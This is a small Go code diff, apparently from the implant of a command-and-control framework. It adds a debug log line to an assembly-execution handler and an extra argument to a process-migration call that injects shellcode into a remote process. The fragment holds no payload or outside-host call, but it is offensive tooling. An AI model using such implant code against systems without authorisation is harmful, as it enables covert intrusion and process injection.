@@ -125,6 +125,9 @@ func elevateHandler(data []byte, resp RPCResponse) {
 }
 
 func executeAssemblyHandler(data []byte, resp RPCResponse) {
+	//{{if .Debug}}
+	log.Println("executeAssemblyHandler called")
+	//{{end}}
 	execReq := &pb.ExecuteAssemblyReq{}
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
@@ -159,7 +162,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Shellcode)
+	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Shellcode, false)
 	// {{if .Debug}}
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
